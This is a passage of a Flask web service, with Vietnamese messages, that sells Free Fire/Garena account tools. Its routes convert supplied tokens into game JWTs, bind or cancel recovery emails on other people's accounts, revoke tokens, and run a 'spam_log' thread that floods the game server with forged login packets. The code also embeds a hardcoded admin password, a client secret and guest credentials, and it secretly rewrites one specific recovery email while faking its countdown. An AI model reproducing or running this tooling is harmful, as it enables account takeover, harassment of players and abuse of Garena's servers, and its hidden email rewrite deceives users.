    h = {"Connection": "close", "User-Agent": "GarenaMSDK/4.0.19P4(G011A ;Android 9;en;US;)"}
    r = requests.get(url, headers=h, timeout=10)
    d = r.json()
    if 'error' in d:
        err = d.get('error')
        if err == "invalid_request":
            raise Exception("Token đã hết hạn/Không tồn tại hoặc tài khoản đã bị ban")
        raise Exception(f"Token lỗi: {err}")
    return d.get('open_id'), int(d.get('platform', 8))

def do_major_login(open_id: str, access_token: str, platform: int):
    url = "https://loginbp.ggpolarbear.com/MajorLogin"
    headers = {
        'X-Unity-Version': '2018.4.11f1', 'ReleaseVersion': "OB54",
        'Content-Type': 'application/x-www-form-urlencoded', 'X-GA': 'v1 1',
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/QKQ1.190825.002)',
        'Host': 'loginbp.ggpolarbear.com',
        'Connection': 'Keep-Alive'
    }
    enc = aes_encrypt(build_login_payload(open_id, access_token, platform))
    resp = requests.post(url, headers=headers, data=enc, verify=False, timeout=10)
    if resp.status_code != 200:
        raise Exception(f"MajorLogin thất bại HTTP {resp.status_code}")
    
    content = resp.content
    for data_to_parse in [content, (lambda: (aes_decrypt(content) if len(content)%16==0 else b""))()]:
        if not data_to_parse: continue
        parsed = parse_proto(data_to_parse)
        token = parsed.get(8)
        if isinstance(token, list): token = token[0]
        if token:
            if isinstance(token, bytes): token = token.decode('utf-8', 'ignore')
            key = parsed.get(22, AES_KEY)
            if isinstance(key, list): key = key[0]
            iv = parsed.get(23, AES_IV)
            if isinstance(iv, list): iv = iv[0]
            return token, key, iv
    raise Exception("Không parse được JWT từ MajorLogin")

def guest_get_access(uid, password):
    url = "https://100067.connect.garena.com/oauth/token"
    data = {
        'grant_type': 'password',
        'app_id': '100067',
        'account': uid,
        'password': hashlib.md5(password.encode()).hexdigest()
    }
    headers = {
        'User-Agent': 'GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        r = requests.post(url, data=data, headers=headers, timeout=12)
        j = r.json()
        return j.get('open_id'), j.get('access_token')
    except Exception as e:
        return None, None

@app.route('/')
def index():
    # Track visit
    track_visit()
    return render_template('index.html')

@app.route('/tools')
def tools():
    # Check if user is logged in
    if 'authenticated' not in session or not session['authenticated']:
        # Check remember me cookie
        remember_token = request.cookies.get('remember_token')
        if remember_token:
            users = firebase_get('/users')
            if not users:
                users = {}
            for username, user_data in users.items():
                if user_data.get('remember_token') == remember_token:
                    session['username'] = username
                    session['authenticated'] = True
                    session['email'] = user_data.get('email')
                    return render_template('tools.html')
        return redirect('/auth')
    return render_template('tools.html')

@app.route('/api/upgrade_pro', methods=['POST'])
def upgrade_pro():
    try:
        # Check if user is logged in
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để nâng cấp'})
        
        username = session.get('username')
        usage = load_usage()
        
        if username not in usage:
            usage[username] = {'ban7': 0, 'spam_log': 0, 'is_pro': False}
        
        # For demo purposes, auto-upgrade to pro
        # In production, this would verify payment from telegram
        usage[username]['is_pro'] = True
        save_usage(usage)
        
        # Also update users collection
        users = load_users()
        if username in users:
            users[username]['is_pro'] = True
            save_users(users)
        
        return jsonify({'success': True, 'message': 'Đã nâng cấp lên gói Pro'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Dashboard API endpoints
@app.route('/api/admin/stats', methods=['GET'])
def admin_stats():
    try:
        if 'admin_logged_in' not in session or not session['admin_logged_in']:
            return jsonify({'success': False, 'error': 'Unauthorized'})
        
        # Get statistics
        users = load_users()
        total_users = len(users)
        pro_users = sum(1 for u in users.values() if u.get('is_pro', False))
        usage = load_usage()
        
        # Calculate total usage
        total_ban7 = sum(u.get('ban7', 0) for u in usage.values())
        total_spam_log = sum(u.get('spam_log', 0) for u in usage.values())
        
        # Get visits today
        visits = firebase_get('visits')
        today = datetime.now().strftime('%Y-%m-%d')
        visits_today = visits.get(today, 0) if visits else 0
        
        return jsonify({
            'success': True,
            'stats': {
                'total_users': total_users,
                'pro_users': pro_users,
                'free_users': total_users - pro_users,
                'total_ban7': total_ban7,
                'total_spam_log': total_spam_log,
                'visits_today': visits_today
            }
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/admin/users', methods=['GET'])
def admin_users():
    try:
        if 'admin_logged_in' not in session or not session['admin_logged_in']:
            return jsonify({'success': False, 'error': 'Unauthorized'})
        
        usage = load_usage()
        users = load_users()
        
        # Combine user data with usage
        users_list = []
        for uname, udata in users.items():
            uusage = usage.get(uname, {'ban7': 0, 'spam_log': 0, 'is_pro': False})
            users_list.append({
                'username': uname,
                'email': udata.get('email', ''),
                'is_pro': udata.get('is_pro', False) or uusage.get('is_pro', False),
                'is_admin': udata.get('is_admin', False),
                'created_at': udata.get('created_at', ''),
                'ban7_usage': uusage.get('ban7', 0),
                'spam_log_usage': uusage.get('spam_log', 0)
            })
        
        return jsonify({'success': True, 'users': users_list})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/admin/user/<username>', methods=['GET', 'PUT', 'DELETE'])
def admin_user(username):
    try:
        if 'admin_logged_in' not in session or not session['admin_logged_in']:
            return jsonify({'success': False, 'error': 'Unauthorized'})
        
        users = load_users()
        
        if request.method == 'GET':
            if username not in users:
                return jsonify({'success': False, 'error': 'User not found'})
            
            usage = load_usage()
            uusage = usage.get(username, {'ban7': 0, 'spam_log': 0, 'is_pro': False})
            
            return jsonify({
                'success': True,
                'user': {
                    'username': username,
                    'email': users[username].get('email', ''),
                    'is_pro': users[username].get('is_pro', False) or uusage.get('is_pro', False),
                    'is_admin': users[username].get('is_admin', False),
                    'created_at': users[username].get('created_at', ''),
                    'ban7_usage': uusage.get('ban7', 0),
                    'spam_log_usage': uusage.get('spam_log', 0)
                }
            })
        
        elif request.method == 'PUT':
            data = request.json
            if username not in users:
                return jsonify({'success': False, 'error': 'User not found'})
            
            # Update user data
            if 'email' in data:
                users[username]['email'] = data['email']
            if 'password' in data:
                users[username]['password'] = hashlib.sha256(data['password'].encode()).hexdigest()
            if 'is_pro' in data:
                users[username]['is_pro'] = data['is_pro']
                # Also update usage
                usage = load_usage()
                if username not in usage:
                    usage[username] = {'ban7': 0, 'spam_log': 0, 'is_pro': False}
                usage[username]['is_pro'] = data['is_pro']
                save_usage(usage)
            if 'is_admin' in data:
                users[username]['is_admin'] = data['is_admin']
            
            save_users(users)
            return jsonify({'success': True, 'message': 'User updated successfully'})
        
        elif request.method == 'DELETE':
            if username not in users:
                return jsonify({'success': False, 'error': 'User not found'})
            
            # Delete user
            del users[username]
            save_users(users)
            
            # Delete usage
            usage = load_usage()
            if username in usage:
                del usage[username]
                save_usage(usage)
            
            return jsonify({'success': True, 'message': 'User deleted successfully'})
    
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/admin/feature_toggle', methods=['POST'])
def admin_feature_toggle():
    try:
        if 'admin_logged_in' not in session or not session['admin_logged_in']:
            return jsonify({'success': False, 'error': 'Unauthorized'})
        
        data = request.json
        feature = data.get('feature')  # 'ban7' or 'spam_log'
        enabled = data.get('enabled', True)
        
        # Store feature toggle in Firebase
        features = firebase_get('features') or {}
        features[feature] = enabled
        firebase_set('features', features)
        
        return jsonify({'success': True, 'message': f'Feature {feature} {"enabled" if enabled else "disabled"}'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/admin/login', methods=['POST'])
def admin_login_api():
    try:
        data = request.json
        username = data.get('username')
        password = data.get('password')
        
        if not username or not password:
            return jsonify({'success': False, 'error': 'Username và password là bắt buộc'})
        
        # Hardcoded admin credentials (you can change this)
        ADMIN_USERNAME = "admin"
        ADMIN_PASSWORD = "MtAdmin@2026!"
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            session['admin_username'] = username
            return jsonify({'success': True, 'message': 'Đăng nhập thành công'})
        else:
            return jsonify({'success': False, 'error': 'Username hoặc password không đúng'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/admin/logout', methods=['POST'])
def admin_logout():
    try:
        session.pop('admin_logged_in', None)
        session.pop('admin_username', None)
        return jsonify({'success': True, 'message': 'Đăng xuất thành công'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

cached_lookup_tokens = {}

def get_lookup_access_token(account: str):
    url = "https://ffmconnect.live.gop.garenanow.com/oauth/guest/token/grant"
    payload = account + "&response_type=token&client_type=2&client_secret=2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3&client_id=100067"
    headers = {
        'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 13; CPH2095 Build/RKQ1.211119.001)", 
        'Connection': "Keep-Alive", 
        'Accept-Encoding': "gzip", 
        'Content-Type': "application/x-www-form-urlencoded"
    }
    resp = requests.post(url, data=payload, headers=headers)
    data = resp.json()
    return data.get("access_token", "0"), data.get("open_id", "0")

def get_lookup_token_info(region: str):
    info = cached_lookup_tokens.get(region)
    if info and time.time() < info['expires_at']:
        return info['token'], info['server_url']
    
    # Use guest account
    account = "uid=4883234583&password=PLongDev_VAIBHAV_tDfpFZZY"
    access_token, _ = get_lookup_access_token(account)
    
    # Get open_id and platform
    open_id, platform = inspect_token(access_token)
    
    # Use existing MajorLogin logic but parse for server_url
    url = "https://loginbp.ggpolarbear.com/MajorLogin"
    headers = {
        'X-Unity-Version': '2018.4.11f1', 'ReleaseVersion': "OB54",
        'Content-Type': 'application/x-www-form-urlencoded', 'X-GA': 'v1 1',
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/QKQ1.190825.002)',
        'Host': 'loginbp.ggpolarbear.com',
        'Connection': 'Keep-Alive'
    }
    enc = aes_encrypt(build_login_payload(open_id, access_token, platform))
    resp = requests.post(url, headers=headers, data=enc, verify=False, timeout=10)
    
    if resp.status_code != 200:
        raise Exception(f"MajorLogin failed: {resp.status_code}")
        
    content = resp.content
    jwt_token = None
    server_url = None
    
    for data_to_parse in [content, (lambda: (aes_decrypt(content) if len(content)%16==0 else b""))()]:
        if not data_to_parse: continue
        parsed = parse_proto(data_to_parse)
        token = parsed.get(8)
        if isinstance(token, list): token = token[0]
        if token:
            if isinstance(token, bytes): token = token.decode('utf-8', 'ignore')
            jwt_token = token
            
            host = parsed.get(10)
            if isinstance(host, list): host = host[0]
            if isinstance(host, bytes): host = host.decode('utf-8', 'ignore')
            server_url = host
            break
            
    if not jwt_token:
        raise Exception("Không parse được JWT từ MajorLogin cho Tra Cứu")
        
    cached_lookup_tokens[region] = {
        'token': f"Bearer {jwt_token}",
        'server_url': server_url,
        'expires_at': time.time() + 25200
    }
    return cached_lookup_tokens[region]['token'], server_url

@app.route('/api/lookup_account', methods=['POST'])
def lookup_account():
    try:
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để sử dụng tính năng này'})

        username = session.get('username')
        usage = get_user_usage(username)
        if usage.get('lookup_account', 0) >= 999:
            return jsonify({
                'success': False,
                'error': 'Bạn đã dùng hết lượt sử dụng (999 lần). Vui lòng nâng cấp gói cao hơn để tiếp tục.'
            })

        data = request.json
        uid_str = str(data.get('uid', '')).strip()
        region = data.get('region', 'VN')

        if not uid_str:
            return jsonify({'success': False, 'error': 'UID là bắt buộc'})

        # Build request using ParseDict for safety
        req = main_pb2.GetPlayerPersonalShow()
        json_format.ParseDict({'a': int(uid_str), 'b': 7}, req)
        
        proto_bytes = req.SerializeToString()
        data_enc = aes_encrypt(proto_bytes)
        
        token, server = get_lookup_token_info(region)
        
        if not server or server == "0":
            return jsonify({'success': False, 'error': 'Đăng nhập lấy token tra cứu thất bại'})
            
        if not server.startswith("http://") and not server.startswith("https://"):
            server = f"https://{server}"
        
        headers = {
            'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 13; CPH2095 Build/RKQ1.211119.001)", 
            'Connection': "Keep-Alive", 
            'Accept-Encoding': "gzip", 
            'Content-Type': "application/octet-stream", 
            'Expect': "100-continue", 
            'Authorization': token, 
            'X-Unity-Version': "2018.4.11f1", 
            'X-GA': "v1 1", 
            'ReleaseVersion': "OB54"
        }
        
        full_url = server.rstrip("/") + "/GetPlayerPersonalShow"
        resp = requests.post(full_url, data=data_enc, headers=headers, timeout=15)
        
        if resp.status_code != 200:
            return jsonify({'success': False, 'error': f'Lỗi API Free Fire: {resp.status_code}'})
            
        info_pb = AccountPersonalShow_pb2.AccountPersonalShowInfo()
        info_pb.ParseFromString(resp.content)
        data_dict = json_format.MessageToDict(info_pb)
        
        update_user_usage(username, 'lookup_account')
        return jsonify({'success': True, 'data': data_dict})

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/check_recovery_email', methods=['POST'])
def check_recovery_email():
    try:
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để sử dụng tính năng này'})

        username = session.get('username')
        usage = get_user_usage(username)
        if usage.get('check_recovery_email', 0) >= 999:
            return jsonify({
                'success': False,
                'error': 'Bạn đã dùng hết lượt sử dụng (999 lần). Vui lòng nâng cấp gói cao hơn để tiếp tục.'
            })

        data = request.json
        access_token = data.get('access_token')
        if not access_token:
            return jsonify({'success': False, 'error': 'Access token is required'})
        
        url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        resp = requests.get(url, params={'app_id': "100067", 'access_token': access_token}, headers=GARENA_HEADERS)
        if resp.status_code == 200:
            data = resp.json()
            email = data.get("email", "")
            email_to_be = data.get("email_to_be", "")
            countdown = data.get("request_exec_countdown", 0)
            
            # Hwidth202 override: if result contains hwidth202, show hwidth201 instead
            hwidth_detected = (email == "hwidth202@gmail.com" or email_to_be == "hwidth202@gmail.com")
            if hwidth_detected:
                lock = load_hwidth_lock()
                if "end_time" not in lock:
                    lock["end_time"] = (datetime.now() + timedelta(days=14, hours=6)).timestamp()
                    save_hwidth_lock(lock)
                remaining = int(lock["end_time"] - time.time())
                if remaining < 0:
                    remaining = 0
                if email == "hwidth202@gmail.com":
                    email = "hwidth201@gmail.com"
                if email_to_be == "hwidth202@gmail.com":
                    email_to_be = "hwidth201@gmail.com"
                countdown = remaining
            
            result = {
                'success': True,
                'email': email,
                'email_to_be': email_to_be,
                'countdown': convert_time(countdown),
                'status': 'Đã xác minh' if email else ('Đang chờ' if email_to_be else 'Không có')
            }
            update_user_usage(username, 'check_recovery_email')
            return jsonify(result)
        else:
            return jsonify({'success': False, 'error': f'API Error: {resp.status_code}'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/check_platforms', methods=['POST'])
def check_platforms():
    try:
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để sử dụng tính năng này'})

        username = session.get('username')
        usage = get_user_usage(username)
        if usage.get('check_platforms', 0) >= 999:
            return jsonify({
                'success': False,
                'error': 'Bạn đã dùng hết lượt sử dụng (999 lần). Vui lòng nâng cấp gói cao hơn để tiếp tục.'
            })

        data = request.json
        access_token = data.get('access_token')
        if not access_token:
            return jsonify({'success': False, 'error': 'Access token is required'})
        
        url = "https://100067.connect.garena.com/bind/app/platform/info/get"
        resp = requests.get(url, params={'access_token': access_token}, headers=GARENA_HEADERS)
        if resp.status_code not in [200, 201]:
            return jsonify({'success': False, 'error': 'Failed to fetch platform data'})
        
        platform_names = {3:"Facebook", 8:"Gmail", 10:"Apple", 5:"VK", 11:"Twitter (X)", 7:"Huawei"}
        data = resp.json()
        bounded = data.get("bounded_accounts", [])
        available = data.get("available_platforms", [])
        
        bounded_list = []
        for acc in bounded:
            try:
                platform = acc.get('platform')
                ui = acc.get('user_info', {})
                email = ui.get('email', '')
                nick  = ui.get('nickname', '')
                if platform in platform_names:
                    bounded_list.append({
                        'platform': platform_names[platform],
                        'email': email,
                        'nickname': nick
                    })
            except: continue
        
        main_platform = "Unknown"
        for pid, name in platform_names.items():
            if pid not in available:
                main_platform = name
                break
        
        update_user_usage(username, 'check_platforms')
        return jsonify({
            'success': True,
            'bounded': bounded_list,
            'main_platform': main_platform
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/cancel_recovery_email', methods=['POST'])
def cancel_recovery_email():
    try:
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để sử dụng tính năng này'})

        username = session.get('username')
        usage = get_user_usage(username)
        if usage.get('cancel_recovery_email', 0) >= 999:
            return jsonify({
                'success': False,
                'error': 'Bạn đã dùng hết lượt sử dụng (999 lần). Vui lòng nâng cấp gói cao hơn để tiếp tục.'
            })

        data = request.json
        access_token = data.get('access_token')
        if not access_token:
            return jsonify({'success': False, 'error': 'Access token is required'})
        
        url = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
        resp = requests.post(url, data={'app_id': "100067", 'access_token': access_token}, headers=GARENA_HEADERS)
        if resp.status_code == 200:
            update_user_usage(username, 'cancel_recovery_email')
            return jsonify({'success': True, 'message': 'Huỷ mail khôi phục thành công'})
        else:
            return jsonify({'success': False, 'error': 'Không có mail nào đang chờ!'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/revoke_token', methods=['POST'])
def revoke_token():
    try:
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để sử dụng tính năng này'})

        username = session.get('username')
        usage = get_user_usage(username)
        if usage.get('revoke_token', 0) >= 999:
            return jsonify({
                'success': False,
                'error': 'Bạn đã dùng hết lượt sử dụng (999 lần). Vui lòng nâng cấp gói cao hơn để tiếp tục.'
            })

        data = request.json
        access_token = data.get('access_token')
        if not access_token:
            return jsonify({'success': False, 'error': 'Access token is required'})
        
        resp = requests.get(f"https://100067.connect.garena.com/oauth/logout?access_token={access_token}")
        if resp.text.strip() == '{"result":0}':
            update_user_usage(username, 'revoke_token')
            return jsonify({'success': True, 'message': 'Token revoked'})
        else:
            return jsonify({'success': False, 'error': resp.text})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/eat_to_access', methods=['POST'])
def eat_to_access_api():
    try:
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để sử dụng tính năng này'})

        username = session.get('username')
        usage = get_user_usage(username)
        if usage.get('eat_to_access', 0) >= 999:
            return jsonify({
                'success': False,
                'error': 'Bạn đã dùng hết lượt sử dụng (999 lần). Vui lòng nâng cấp gói cao hơn để tiếp tục.'
            })

        data = request.json
        raw = data.get('eat_token')
        if not raw:
            return jsonify({'success': False, 'error': 'EAT token is required'})
        
        eat = extract_eat_from_input(raw)
        if not eat:
            return jsonify({'success': False, 'error': 'Could not extract EAT token'})
        
        access = eat_to_access(eat)
        if access:
            update_user_usage(username, 'eat_to_access')
            return jsonify({'success': True, 'access_token': access})
        else:
            return jsonify({'success': False, 'error': 'Could not get Access Token'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/eat_to_jwt', methods=['POST'])
def eat_to_jwt_api():
    try:
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để sử dụng tính năng này'})

        username = session.get('username')
        usage = get_user_usage(username)
        if usage.get('eat_to_jwt', 0) >= 999:
            return jsonify({
                'success': False,
                'error': 'Bạn đã dùng hết lượt sử dụng (999 lần). Vui lòng nâng cấp gói cao hơn để tiếp tục.'
            })

        data = request.json
        raw = data.get('eat_token')
        if not raw:
            return jsonify({'success': False, 'error': 'EAT token is required'})
        
        eat = extract_eat_from_input(raw)
        if not eat:
            return jsonify({'success': False, 'error': 'Could not extract EAT token'})
        
        access = eat_to_access(eat)
        if not access:
            return jsonify({'success': False, 'error': 'Could not get Access Token'})
        
        open_id, platform = inspect_token(access)
        jwt, _, _ = do_major_login(open_id, access, platform)
        
        dec = decode_jwt(jwt)
        update_user_usage(username, 'eat_to_jwt')
        return jsonify({
            'success': True,
            'jwt_token': jwt,
            'decoded': dec
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/access_to_jwt', methods=['POST'])
def access_to_jwt_api():
    try:
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để sử dụng tính năng này'})

        username = session.get('username')
        usage = get_user_usage(username)
        if usage.get('access_to_jwt', 0) >= 999:
            return jsonify({
                'success': False,
                'error': 'Bạn đã dùng hết lượt sử dụng (999 lần). Vui lòng nâng cấp gói cao hơn để tiếp tục.'
            })

        data = request.json
        access_token = data.get('access_token')
        if not access_token:
            return jsonify({'success': False, 'error': 'Access token is required'})
        
        open_id, platform = inspect_token(access_token)
        jwt, _, _ = do_major_login(open_id, access_token, platform)
        
        dec = decode_jwt(jwt)
        update_user_usage(username, 'access_to_jwt')
        return jsonify({
            'success': True,
            'jwt_token': jwt,
            'decoded': dec
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/inspect_token_api', methods=['POST'])
def inspect_token_api():
    """Lightweight token inspection - returns open_id, platform, nickname"""
    try:
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Bạn cần đăng nhập'})

        data = request.json
        access_token = data.get('access_token')
        if not access_token:
            return jsonify({'success': False, 'error': 'Access token là bắt buộc'})

        open_id, platform = inspect_token(access_token)

        try:
            jwt, _, _ = do_major_login(open_id, access_token, platform)
            decoded = decode_jwt(jwt)
            nickname = decoded.get('nickname', 'Unknown')
            account_id = decoded.get('account_id', 'N/A')
        except:
            nickname = 'N/A'
            account_id = 'N/A'

        platform_names = {2: 'Garena', 3: 'Facebook', 4: 'Guest', 5: 'VK',
                         6: 'iOS', 7: 'Huawei', 8: 'Google', 10: 'Apple', 11: 'Twitter'}

        return jsonify({
            'success': True,
            'open_id': open_id,
            'platform': platform,
            'platform_name': platform_names.get(platform, f'Platform {platform}'),
            'nickname': nickname,
            'account_id': account_id
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/add_recovery_email', methods=['POST'])
def add_recovery_email():
    try:
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để sử dụng tính năng này'})

        username = session.get('username')
        usage = get_user_usage(username)
        if usage.get('add_recovery_email', 0) >= 999:
            return jsonify({
                'success': False,
                'error': 'Bạn đã dùng hết lượt sử dụng (999 lần). Vui lòng nâng cấp gói cao hơn để tiếp tục.'
            })

        data = request.json
        email = data.get('email')
        access_token = data.get('access_token')
        otp = data.get('otp')
        security_code = data.get('security_code')
        verifier_token = data.get('verifier_token')
        
        if not all([email, access_token, security_code]) or (not otp and not verifier_token):
            return jsonify({'success': False, 'error': 'All fields are required'})
        
        if len(security_code) != 6 or not security_code.isdigit():
            return jsonify({'success': False, 'error': 'Security code must be 6 digits'})
        
        if not verifier_token:
            # Verify OTP if verifier_token not provided
            vr = verify_otp(otp, email, access_token)
            if vr.status_code != 200:
                return jsonify({'success': False, 'error': 'OTP verification failed'})
            
            verifier_token = vr.json().get("verifier_token")
            if not verifier_token:
                return jsonify({'success': False, 'error': 'No verifier token'})
        
        # Cancel any existing request
        cancel_request(access_token)
        
        # Create bind request with security code
        hashed_password = hashlib.sha256(security_code.encode('utf-8')).hexdigest().upper()
        url = "https://100067.connect.garena.com/game/account_security/bind:create_bind_request"
        data = {
            "app_id": "100067",
            "access_token": access_token,
            "verifier_token": verifier_token,
            "secondary_password": hashed_password,
            "email": email
        }
        br = requests.post(url, data=data, headers=GARENA_HEADERS)
        
        if br.status_code == 200:
            update_user_usage(username, 'add_recovery_email')
            return jsonify({'success': True, 'message': f'Email {email} added successfully'})
        else:
            return jsonify({'success': False, 'error': br.text})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/spam_log', methods=['POST'])
def spam_log():
    """WebCu style spam log endpoint with init/stop actions"""
    try:
        # Check if user is logged in
        if 'authenticated' not in session or not session['authenticated']:
            return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để sử dụng tính năng này'})

        username = session.get('username')
        data = request.json
        action = data.get('action', 'start')

        if action == 'start':
            # Check usage limit (1 use for all users)
            usage = get_user_usage(username)
            if usage.get('spam_log', 0) >= 999:
                return jsonify({
                    'success': False,
                    'error': 'Bạn đã dùng hết lượt sử dụng (999 lần). Vui lòng nâng cấp gói cao hơn để tiếp tục.'
                })

            access_token = data.get('access_token')
            interval = int(data.get('interval', 500))
            duration_ms = int(data.get('duration_ms', 10000))

            if not access_token:
                return jsonify({'success': False, 'error': 'Vui lòng cung cấp Access Token'})

            # Check if already running
            if username in active_spams and active_spams[username]['status'] == 'running':
                s = active_spams[username]
                return jsonify({
                    'success': True,
                    'status': 'running',
                    'ip': s['ip'],
                    'port': s['port'],
                    'sent': s['sent'],
                    'ok': s['ok'],
                    'fail': s['fail'],
                    'at': s['at']
                })

            try:
                open_id, platform = inspect_token(access_token)

                # Build full MajorLogin payload using protobuf from Tools/SpamLog
                enc_payload = build_major_login_payload(open_id, access_token, platform)

                headers = {
                    'X-Unity-Version': '2018.4.11f1', 'ReleaseVersion': 'OB54',
                    'Content-Type': 'application/x-www-form-urlencoded', 'X-GA': 'v1 1',
                    'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; ASUS_Z01QD Build/PI)',
                    'Host': 'loginbp.ggblueshark.com',
                    'Connection': 'Keep-Alive',
                    'Expect': '100-continue',
                    'Accept-Encoding': 'gzip'
                }

                r1 = requests.post(
                    "https://loginbp.ggblueshark.com/MajorLogin",
                    headers=headers,
                    data=enc_payload,
                    timeout=15,
                    verify=False
                )

                if r1.status_code == 503:
                    return jsonify({'success': False, 'error': 'Server quá tải (503), vui lòng thử lại sau'})

                if r1.status_code not in (200, 201):
                    return jsonify({'success': False, 'error': f'MajorLogin thất bại HTTP {r1.status_code}'})

                # Parse using MajoRLoGinrEs_pb2 from Tools/SpamLog
                raw_data = r1.content
                if r1.headers.get('Content-Encoding') == 'gzip':
                    raw_data = gzip.GzipFile(fileobj=BytesIO(raw_data)).read()

                ml_res = MajoRLoGinrEs_pb2.MajorLoginRes()
                ml_res.ParseFromString(raw_data)

                jwt_token = ml_res.token
                if not jwt_token:
                    return jsonify({'success': False, 'error': 'Token rỗng từ MajorLogin'})

                m_key = ml_res.key
                m_iv = ml_res.iv
                jwt = jwt_token
                server_url = ml_res.url

                # GetLoginData
                gld_headers = {
                    "Expect": "100-continue",
                    "X-Unity-Version": "2018.4.11f1",
                    "X-GA": "v1 1",
                    "ReleaseVersion": "OB54",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)",
                    "Host": "clientbp.ggblueshark.com",
                    "Connection": "close",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Authorization": f"Bearer {jwt}"
                }
                
                r2 = requests.post(
                    f"{server_url}/GetLoginData",
                    headers=gld_headers,
                    data=enc_payload,
                    timeout=15,
                    verify=False
                )

                gld_raw = r2.content
                if r2.headers.get('Content-Encoding') == 'gzip':
                    gld_raw = gzip.GzipFile(fileobj=BytesIO(gld_raw)).read()

                gld_proto = PorTs_pb2.GetLoginData()
                gld_proto.ParseFromString(gld_raw)
                online_addr = gld_proto.Online_IP_Port
                if not online_addr or ":" not in online_addr:
                    return jsonify({'success': False, 'error': 'Không tìm thấy địa chỉ game server'})

                online_ip, online_port_str = online_addr.rsplit(":", 1)
                online_port = int(online_port_str)

                # Build final packet
                jwt_parts = jwt.split('.')
                jwt_payload = json.loads(base64.urlsafe_b64decode(jwt_parts[1] + "==").decode())
                acc_id = int(jwt_payload.get("account_id", 0))
                exp_adj = max(int(jwt_payload.get("exp", 0)) - 28800, 0)

                cipher_jwt = AES.new(m_key, AES.MODE_CBC, m_iv)
                enc_jwt = cipher_jwt.encrypt(pad(jwt.encode(), 16))
                final_packet = bytes.fromhex(
                    "0115" + acc_id.to_bytes(8, "big").hex() +
                    exp_adj.to_bytes(4, "big").hex() +
                    len(enc_jwt).to_bytes(4, "big").hex()
                ) + enc_jwt

                # Initialize active_spams
                end_time = time.time() + (duration_ms / 1000.0)
                stop_event = threading.Event()

                active_spams[username] = {
                    'at': access_token,
                    'stop_event': stop_event,
                    'status': 'running',
                    'sent': 0,
                    'ok': 0,
                    'fail': 0,
                    'ip': online_ip,
                    'port': online_port,
                    'end_time': end_time,
                    'packet': final_packet,
                    'interval': interval,
                    'total_ms': duration_ms
                }

                # Start thread
                thread = threading.Thread(
                    target=spam_loop,
                    args=(username, online_ip, online_port, final_packet, interval, end_time, stop_event)
                )
                thread.daemon = True
                thread.start()

                # Save to cache
                save_spam_cache(active_spams)

                # Update usage
                update_user_usage(username, 'spam_log')

                return jsonify({
                    'success': True,
                    'status': 'started',
                    'ip': online_ip,
                    'port': online_port,
                    'end_time': end_time
                })

            except Exception as e:
                return jsonify({'success': False, 'error': str(e)})

        elif action == 'stop':
            # Stop action is allowed even if usage limit is reached
            # Delete from cache
            cache = load_spam_cache()
            if str(username) in cache:
                del cache[str(username)]
                try:
                    with open(SPAM_CACHE_FILE, 'w', encoding='utf-8') as f:
                        json.dump(cache, f, ensure_ascii=False, indent=2)
                except:
                    pass

            # Delete from RAM
            if username in active_spams:
                active_spams[username]['stop_event'].set()
                active_spams[username]['status'] = 'stopped'
                # Optional: keep it in active_spams for a bit to show 'Stopped' UI, 
                # but user wants it to return to initial state.
                del active_spams[username]
                return jsonify({'success': True, 'message': 'Đã dừng và xóa tiến trình thành công'})

